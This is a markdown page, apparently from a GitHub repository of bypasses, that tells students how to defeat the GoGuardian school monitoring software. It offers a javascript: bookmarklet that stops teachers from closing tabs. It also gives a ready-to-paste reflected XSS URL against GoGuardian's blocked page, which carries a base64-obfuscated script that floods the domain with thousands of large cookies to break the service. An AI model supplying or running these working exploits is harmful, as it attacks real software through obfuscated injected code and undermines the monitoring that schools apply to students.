  * **GoGuardian Bypasses:**
     - [GoGuardian Bypass](#goguardian-bypass)
     - [GoGuardian Bypass #2 (better)](#goguardian-bypass-2-better)
---
### GoGuardian Bypass
**Caution!** Teachers can still see your screen, but they can't block or close any of your tabs. <br>
You must have a tab limit for this to work. <br> <br>
Instructions: <br>
1. Create a bookmark named anything with this code: `javascript: window.onbeforeunload = ()=>{return false;}`
2. Hold down CTRL and then SPAM CLICK the bookmark until you're well above the tab limit, opening a bunch of about:blank pages.
3. It might ask if you want to leave this page, this is GoGuardian trying to close it.
4. Say No and click Prevent from creating additional dialogues.
5. Enjoy your unblocked stay!
 <br>
Close all of your about:blank tabs to undo.

### GoGuardian Bypass #2 (better)
found by akabutnice <br>
This will not work if you have other extensions other than goguardian.  <br>

Go to this link in another tab
```js
https://student.goguardian.com/teacher/blocked.html?cs=[{"name":""}, {"name":"<style>*{display:none}</style><iframe srcdoc="<script>top.eval(atob(`bGV0IGNvb2tpZXMgPSBbXTsKCmZvciAobGV0IGkgPSAwOyBpIDwgMmUzOyBpKyspIHsKICBjb29raWVzLnB1c2goewogICAgbmFtZTogYGNkJHtpfWAsCiAgICB2YWx1ZTogZW5jb2RlVVJJQ29tcG9uZW50KGJ0b2EoY3J5cHRvLmdldFJhbmRvbVZhbHVlcyhuZXcgVWludDhBcnJheSgyNSAqIDI1KSkpKSwKICAgIGV4cGlyZXM6IG5ldyBEYXRlKDJlMTQpLnRvVVRDU3RyaW5nKCksCiAgICBwYXRoOiAiLyIsCiAgICBkb21haW46IGxvY2F0aW9uLmhvc3Quc3BsaXQoIi4iKS5zbGljZSgtMikuam9pbigiLiIpCiAgfSk7Cn0KCmNvb2tpZXMgPSBjb29raWVzLm1hcChjb29raWUgPT4gYCR7Y29va2llLm5hbWV9PSR7Y29va2llLnZhbHVlfTtleHBpcmVzPSR7Y29va2llLmV4cGlyZXN9O3BhdGg9JHtjb29raWUucGF0aH07ZG9tYWluPSR7Y29va2llLmRvbWFpbn07YCk7Cgpjb29raWVzLmZvckVhY2goKGNvb2tpZSkgPT4gKGRvY3VtZW50LmNvb2tpZSA9IGNvb2tpZSkpO2hpc3RvcnkucmVwbGFjZVN0YXRlKHt9LHt9LCcvJyk==`))</script>"></iframe>"}]
```
There will be a white screen with nothing in it, so refresh the page <br>
Don't worry if the GET request fails and you are left on an error screen.<br>
Visit `chrome://restart` to clear cached sites from GoGuardian. <br>

<br> **Back to [README file](https://github.com/wea-f/ByePassHub/blob/main/Exploits/README.md)** (The starting file)
